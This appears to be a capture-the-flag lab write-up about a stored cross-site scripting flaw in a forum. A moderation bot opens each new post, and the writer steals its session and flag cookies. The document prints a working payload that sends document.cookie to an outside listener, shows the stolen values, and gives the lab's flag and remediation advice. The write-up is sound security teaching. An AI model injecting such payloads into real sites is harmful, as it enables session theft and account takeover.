# Breach 08 — Stored XSS → moderation-bot cookie theft

**Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
**Type:** OWASP A03 — Injection (Cross-Site Scripting, stored)

## How it works
Forum posts and comments render user-supplied HTML **unsanitised** — the UI
says *"HTML supported for formatting"* and the source comments confirm *"content
goes straight into the DB"* and *"the 'HTML is supported' note is not ironic at
all."*

So we post a thread whose body is:
```html
<img src=x onerror="new Image().src='http://10.0.2.2:9900/steal?c='+encodeURIComponent(document.cookie)">
```
An **automated moderation bot** opens every new thread within ~a minute in a
real browser (banner: *"Every new post is opened by our automated moderation
bot"*). Crucially, the source notes *"the moderation bot opens every thread with
a live session… and a 'flag' cookie that isn't httpOnly."* The payload runs in
the bot's context and sends `document.cookie` to our listener (the VM reaches
the host at `10.0.2.2`). The exfiltrated cookies contain:
```
session=<bot JWT>; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}
```

## Impact
Script execution in other users' authenticated sessions: session/cookie theft
(the session JWT is not `HttpOnly`, Breach 05), account takeover, and actions
performed as the victim. Reflected XSS also exists in the newsletter banner
(Breach 09).

## Remediation
- Contextually output-encode all user data; do **not** render user HTML. If rich
  text is required, sanitise with an allow-list (e.g. bleach/DOMPurify).
- Set the session cookie `HttpOnly` (and `Secure`, `SameSite`).
- Add a strict `Content-Security-Policy` to neutralise injected scripts.
